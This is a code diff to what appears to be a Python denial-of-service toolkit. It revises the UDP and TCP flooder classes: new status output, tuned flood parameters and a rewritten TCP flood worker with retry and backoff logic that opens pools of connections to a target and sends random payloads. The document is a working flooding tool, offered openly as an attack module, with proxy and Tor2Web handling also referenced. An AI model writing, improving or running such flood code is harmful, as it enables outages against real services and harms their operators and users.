@@ -62,6 +62,16 @@ class UDPFlooder(AttackModule):
         
         # Initialize payload pool
         self.initialize_payload_pool()
+        
+        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: UDPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
+        self.status_length = len(self.status_format.format(
+            timestamp="00:00:00",
+            target="000.000.000.000",
+            port="00000",
+            pps=0.0,
+            mbps=0.0,
+            rate=100
+        ))
     
     def initialize_payload_pool(self):
         """Pre-generate payload patterns for various ports and sizes"""
@@ -339,39 +349,35 @@ class UDPFlooder(AttackModule):
         last_bytes = self.stats["bytes_sent"]
         
         while self.running:
-            time.sleep(1.0)  # Update every second
-            
-            current_time = time.time()
-            elapsed = current_time - last_update
-            
-            if elapsed > 0:
-                # Calculate rates
-                current_packets = self.stats["packets_sent"]
-                current_bytes = self.stats["bytes_sent"]
+            try:
+                time.sleep(0.1)  # More frequent updates
+                current_time = time.time()
+                elapsed = current_time - last_update
                 
-                pps = (current_packets - last_packets) / elapsed
-                mbps = ((current_bytes - last_bytes) * 8) / (elapsed * 1000 * 1000)
-                
-                # Update performance tracking
-                self.perf_data["current_pps"] = pps
-                self.perf_data["current_mbps"] = mbps
-                
-                # Track highest values
-                if pps > self.perf_data["highest_pps"]:
-                    self.perf_data["highest_pps"] = pps
-                    if self.debug:
-                        UI.print_success(f"New peak PPS: {pps:.0f}")
-                        
-                if mbps > self.perf_data["highest_mbps"]:
-                    self.perf_data["highest_mbps"] = mbps
-                    if self.debug:
-                        UI.print_success(f"New peak bandwidth: {mbps:.2f} Mbps")
-                
-                # Update last values
-                last_packets = current_packets
-                last_bytes = current_bytes
-                last_update = current_time
-    
+                if elapsed >= 1.0:
+                    # Calculate rates
+                    current_packets = self.stats["packets_sent"]
+                    current_bytes = self.stats["bytes_sent"]
+                    
+                    pps = (current_packets - last_packets) / elapsed
+                    mbps = ((current_bytes - last_bytes) * 8) / (elapsed * 1000 * 1000)
+                    total_attempts = self.stats["successful"] + self.stats["failures"]
+                    success_rate = int((self.stats["successful"] / total_attempts * 100) if total_attempts > 0 else 0)
+                    
+                    # Format status line
+                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
+                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: {self.__class__.__name__.upper()} | PPS: {pps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
+                    
+                    # Print on new line instead of overwriting
+                    print(status_line)
+                    
+                    # Update tracking values
+                    last_packets = current_packets
+                    last_bytes = current_bytes
+                    last_update = current_time
+            except Exception:
+                continue
+
     def start(self):
         """Start the UDP flood operation"""
         super().start()
@@ -429,15 +435,10 @@ class UDPFlooder(AttackModule):
                                            prefix=f"Threads: {thread_count}/{total_threads}", 
                                            length=30)
         
-        # Start performance monitoring thread
+        # Start only the performance monitoring thread
         perf_thread = threading.Thread(target=self.monitor_performance)
-        perf_thread.daemon = True
+        perf_thread.daemon = False  # Changed to non-daemon
         perf_thread.start()
-        
-        # Start stats thread
-        stats_thread = threading.Thread(target=self.show_stats)
-        stats_thread.daemon = True
-        stats_thread.start()
         
         # Run for specified duration
         try:
@@ -471,14 +472,18 @@ class TCPFlooder(AttackModule):
         self.debug = debug
         self.proxy_manager = proxy_manager
         
-        # Performance settings
-        self.sockets_per_thread = 512
-        self.connection_timeout = 0.1
-        self.max_failures_per_target = 10000
-        self.reconnect_delay = 0.0001
-        self.send_buffer_size = 1024 * 1024  # 1MB buffer
-        self.packet_sizes = [8192, 16384, 32768]
+        # Enhanced performance settings
+        self.sockets_per_thread = 256  # Reduced from 512 for better stability
+        self.connection_timeout = 1  # Reduced from 3
+        self.max_failures_per_target = 5000  # Increased from 1000
+        self.reconnect_delay = 0.01  # Reduced from 0.1
+        self.send_buffer_size = 16384  # Reduced buffer size
+        self.packet_sizes = [512, 1024]  # Smaller packet sizes
         self.aggressive_mode = True
+        self.retry_count = 3
+        self.backoff_delay = 0.5
+        self.last_stat_update = time.time()
+        self.stat_update_interval = 1.0
         
         # Pre-generate payloads
         self.payload_cache = [os.urandom(size) for size in self.packet_sizes]
@@ -494,6 +499,17 @@ class TCPFlooder(AttackModule):
             "highest_mbps": 0,
             "bytes_sent": 0
         }
+        self._monitor_thread = None
+        
+        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: TCPFLOODER | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
+        self.status_length = len(self.status_format.format(
+            timestamp="00:00:00",
+            target="000.000.000.000",
+            port="00000",
+            pps=0.0,
+            mbps=0.0,
+            rate=100
+        ))
 
     def monitor_performance(self):
         """Monitor and adjust performance parameters in real-time"""
@@ -501,129 +517,32 @@ class TCPFlooder(AttackModule):
         last_packets = self.stats["packets_sent"]
         
         while self.running:
-            time.sleep(1.0)  # Update every second
-            
-            current_time = time.time()
-            elapsed = current_time - last_update
-            
-            if elapsed > 0:
-                # Calculate rates
-                current_packets = self.stats["packets_sent"]
-                pps = (current_packets - last_packets) / elapsed
-                
-                # Update performance tracking
-                self.perf_data["current_pps"] = pps
-                
-                # Track highest values
-                if pps > self.perf_data["highest_pps"]:
-                    self.perf_data["highest_pps"] = pps
-                    if self.debug:
-                        UI.print_success(f"New peak connections/s: {pps:.0f}")
-                
-                # Update last values
-                last_packets = current_packets
-                last_update = current_time
-                
-                # Print current stats
-                UI.print_status(
-                    f"Connections: {self.stats['successful']:,} | "
-                    f"Failed: {self.stats['failures']:,} | "
-                    f"Rate: {pps:.0f}/s"
-                )
-
-    def _start_monitor_threads(self):
-        """Start monitoring threads"""
-        # Start performance monitoring thread
-        perf_thread = threading.Thread(target=self.monitor_performance)
-        perf_thread.daemon = True
-        perf_thread.start()
-        
-        # Start stats thread
-        stats_thread = threading.Thread(target=self.show_stats)
-        stats_thread.daemon = True
-        stats_thread.start()
-
-    def _print_final_stats(self):
-        """Print final statistics"""
-        elapsed = time.time() - self.start_time
-        cps = self.stats["successful"] / elapsed if elapsed > 0 else 0
-        
-        UI.print_header("Operation Summary")
-        print(f"- Duration: {elapsed:.2f} seconds")
-        print(f"- Total connections: {self.stats['successful']:,}")
-        print(f"- Failed connections: {self.stats['failures']:,}")
-        print(f"- Average rate: {cps:.0f} connections/sec")
-        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} connections/sec")
-
-    def flood_target(self, target: str, port: int):
-        """Ultra optimized TCP flood worker"""
-        sockets = []
-        failures = 0
-        bytes_sent = 0
-        
-        while self.running and failures < self.max_failures_per_target:
             try:
-                # Create new socket with optimized settings
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(self.connection_timeout)
+                time.sleep(0.1)  # More frequent updates
+                current_time = time.time()
+                elapsed = current_time - last_update
                 
-                # Enhanced socket options
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.send_buffer_size)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.send_buffer_size)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                if hasattr(socket, 'TCP_FASTOPEN'):
-                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
-                if hasattr(socket, 'SO_REUSEPORT'):
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-                
-                # Attempt connection
-                sock.connect((target, port))
-                sockets.append(sock)
-                
-                # Aggressive data sending
-                for active_sock in sockets[:]:
-                    try:
-                        # Send multiple packets per connection
-                        for _ in range(4):  # Send 4 packets per cycle
-                            payload = random.choice(self.payload_cache)
-                            sent = active_sock.send(payload)
-                            bytes_sent += sent
-                            self.stats["bytes_sent"] += sent
-                            self.stats["successful"] += 1
-                            self.stats["packets_sent"] += 1
-                    except:
-                        # Remove failed socket
-                        sockets.remove(active_sock)
-                        try:
-                            active_sock.close()
-                        except:
-                            pass
-                
-                # Maintain optimal socket pool size
-                while len(sockets) > self.sockets_per_thread:
-                    sock_to_remove = sockets.pop(0)
-                    try:
-                        sock_to_remove.close()
-                    except:
-                        pass
-                
-                # Brief pause between connection attempts
-                time.sleep(self.reconnect_delay)
-                        
-            except Exception as e:
-                failures += 1
-                self.stats["failures"] += 1
-                if self.debug and failures % 100 == 0:
-                    UI.print_error(f"Connection failed to {target}:{port} - {str(e)}")
-                time.sleep(self.reconnect_delay)
-                
-        # Cleanup
-        for sock in sockets:
-            try:
-                sock.close()
-            except:
-                pass
+                if elapsed >= 1.0:
+                    current_packets = self.stats["packets_sent"]
+                    current_bytes = self.stats["bytes_sent"]
+                    pps = (current_packets - last_packets) / elapsed
+                    mbps = (current_bytes * 8) / (1024 * 1024)
+                    total_attempts = self.stats["successful"] + self.stats["failures"]
+                    success_rate = int((self.stats["successful"] / total_attempts * 100) if total_attempts > 0 else 0)
+                    
+                    # Format status line with fixed width
+                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
+                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: {self.__class__.__name__.upper()} | PPS: {pps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
+                    
+                    # Print on new line instead of overwriting
+                    print(status_line)
+                    
+                    # Update tracking values
+                    last_packets = current_packets
+                    last_update = current_time
+            except Exception:
+                time.sleep(1)
+                continue
 
     def start(self):
         """Start TCP flood operation"""
@@ -657,17 +576,138 @@ class TCPFlooder(AttackModule):
                                            prefix=f"Threads: {thread_count}/{total_threads}",
                                            length=30)
         
-        # Start monitoring threads
-        self._start_monitor_threads()
+        # Start only the performance monitoring thread
+        self._monitor_thread = threading.Thread(target=self.monitor_performance)
+        self._monitor_thread.daemon = False  # Changed to non-daemon
+        self._monitor_thread.start()
         
         # Run for duration
         try:
             time.sleep(self.duration)
         except KeyboardInterrupt:
-            UI.print_warning("Operation interrupted by user")
+            pass
+        finally:
+            self.stop()
+            self._print_final_stats()
+
+    def stop(self):
+        """Stop the operation gracefully"""
+        if not self.running:
+            return
+            
+        self.running = False
+        if self._monitor_thread and self._monitor_thread.is_alive():
+            try:
+                self._monitor_thread.join(timeout=2)
+            except Exception:
+                pass
+
+        # Cleanup all sockets
+        for thread in self.thread_list:
+            try:
+                if thread.is_alive():
+                    thread.join(timeout=1)
+            except Exception:
+                pass
+
+        print("\n")  # New line after status output
+
+    def _print_final_stats(self):
+        """Print final statistics"""
+        elapsed = time.time() - self.start_time
+        cps = self.stats["successful"] / elapsed if elapsed > 0 else 0
         
-        self.stop()
-        self._print_final_stats()
+        UI.print_header("Operation Summary")
+        print(f"- Duration: {elapsed:.2f} seconds")
+        print(f"- Total connections: {self.stats['successful']:,}")
+        print(f"- Failed connections: {self.stats['failures']:,}")
+        print(f"- Average rate: {cps:.0f} connections/sec")
+        print(f"- Peak performance: {self.perf_data['highest_pps']:.0f} connections/sec")
+
+    def flood_target(self, target: str, port: int):
+        """Optimized TCP flood worker with retry logic"""
+        sockets = []
+        failures = 0
+        retry_count = 0
+        
+        while self.running and failures < self.max_failures_per_target:
+            try:
+                # Create new socket with optimized settings
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.connection_timeout)
+                
+                # Basic socket options
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                
+                try:
+                    # Attempt connection with retry logic
+                    for attempt in range(self.retry_count):
+                        try:
+                            sock.connect((target, port))
+                            # Connection successful
+                            sockets.append(sock)
+                            self.stats["successful"] += 1
+                            self.stats["packets_sent"] += 1
+                            retry_count = 0  # Reset retry counter on success
+                            
+                            # Send initial data
+                            payload = random.choice(self.payload_cache)
+                            sock.send(payload)
+                            self.stats["bytes_sent"] += len(payload)
+                            break
+                            
+                        except (socket.timeout, ConnectionRefusedError) as e:
+                            if attempt < self.retry_count - 1:
+                                time.sleep(self.backoff_delay * (attempt + 1))
+                                continue
+                            raise
+                    
+                    # Maintain socket pool size
+                    if len(sockets) > self.sockets_per_thread:
+                        old_sock = sockets.pop(0)
+                        try:
+                            old_sock.shutdown(socket.SHUT_RDWR)
+                            old_sock.close()
+                        except:
+                            pass
+                            
+                except Exception as e:
+                    failures += 1
+                    self.stats["failures"] += 1
+                    retry_count += 1
+                    
+                    if retry_count >= 5:  # Back off after 5 consecutive failures
+                        time.sleep(self.backoff_delay)
+                        retry_count = 0
+                    
+                    if self.debug and failures % 100 == 0:
+                        UI.print_error(f"Connection failed to {target}:{port} - {str(e)}")
+                    
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                    
+                    continue
+                
+                # Brief pause between connection attempts
+                time.sleep(self.reconnect_delay)
+                
+            except Exception as e:
+                failures += 1
+                self.stats["failures"] += 1
+                if self.debug:
+                    UI.print_error(f"Socket creation failed: {str(e)}")
+                time.sleep(self.reconnect_delay)
+        
+        # Cleanup
+        for sock in sockets:
+            try:
+                sock.shutdown(socket.SHUT_RDWR)
+                sock.close()
+            except:
+                pass
 
 class TOR2WebFlooder(AttackModule):
     def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
